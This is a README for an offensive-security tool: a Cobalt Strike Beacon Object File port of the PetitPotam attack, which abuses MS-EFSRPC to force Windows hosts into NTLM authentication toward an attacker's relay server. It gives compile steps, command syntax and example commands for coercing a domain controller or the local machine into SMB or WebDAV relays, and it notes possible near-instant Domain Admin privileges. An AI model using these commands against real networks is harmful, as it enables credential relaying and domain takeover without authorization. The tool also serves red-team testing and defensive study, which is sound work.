# PetitPotam BOF

A BOF port of the PetitPotam attack published by [@topotam77](https://twitter.com/topotam77)

## Background of PetitPotam

The PetitPotam attack is a way to remotely coerce a Windows hosts into authenticating to other systems. It abuses functionality of the [MS-EFSRPC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) (Encrypting File System Remote) protocol, which was incompletely patched by Microsoft in the September 2021 patch round.

MS-EFSRPC allows an attacker to coerce a system into authenticating to a destination system chosen by the attacker using NTLM authentication. With a NTLM relaying tool such as responder.py or Impacket's [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) you can relay to another system that accepts NTLM based authentication. The impact differs on the source and destination systems, but in some cases it may provide you with near-instant Domain Admin privileges.

## How to compile
1. Make sure that Mingw-w64 (including mingw-w64-binutils) has been installed.
2. Enter the SOURCE folder within the tool folder.
3. Type "make" to compile the object files.
4. Use Cobal Strike script manager to import the `PetitPotam.cna` script.

## Usage
Running the tool is straightforward. Once you imported the CNA script using Cobalt Strike's Script Manager, they are available as Cobalt Strike commands that can be executed within a beacon. This tool supports the following commands:

* `PetitPotam [capture server ip or hostname] [target server ip or hostname]`

## Examples
First, prepare your relaying setup (responder, ntlmrelayx e.g.). Then:

* Perform a SMB relay attack with `PetitPotam KALI DC2019` to coerce authentication from a DC to a KALI machine under our control.
* Perform a WebDAV (LDAP/RBCD relay) LPE attack with `PetitPotam KALI@80/nop localhost` to coerce authentication from our machine using WebDAV (HTTP) to a KALI machine under our control.
* Perform a WebDAV (LDAP/RBCD relay) LPE attack with `PetitPotam localhost@80/nop localhost` to coerce authentication from our machine using WebDAV (HTTP) and relay back to our teamserver using socks/rportfwd'ing.

## Limitations
* To be able to coerce authentication using the WebDAV protocol, the WebDAV redirector service needs to be installed (default on client versions of Windows) and the WebClient service needs to be started. On a local Windows client the service can be started using the [StartWebClient](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/StartWebClient) BOF which is available within this repository.
* If you need to relay back to your teamserver (running responder or ntlmrelayx) it is necessary to start 2 separate beacons. One beacon is configured as the socks proxy and reverse port forwarder, the other beacon is used to execute the attack. You won't have this shortcoming in the [reflective DLL version of the code](https://github.com/outflanknl/C2-Tool-Collection/tree/main/Other/PetitPotam), but this version requires a Fork&Run operation.

## Support
This BOF tool has been successfully compiled on Mac OSX systems and used on Windows 8.1+ (x64) systems. Compiling the BOF code should also work on other systems (Linux, Windows) that have the Mingw-w64 compiler installed.

## Credits
* This code is inspired by [@topotam77](https://twitter.com/topotam77) PetitPotam exploit: https://github.com/topotam/PetitPotam
* [@b4rtik](https://twitter.com/b4rtik) for help converting the RPC code to be BOF compatible.
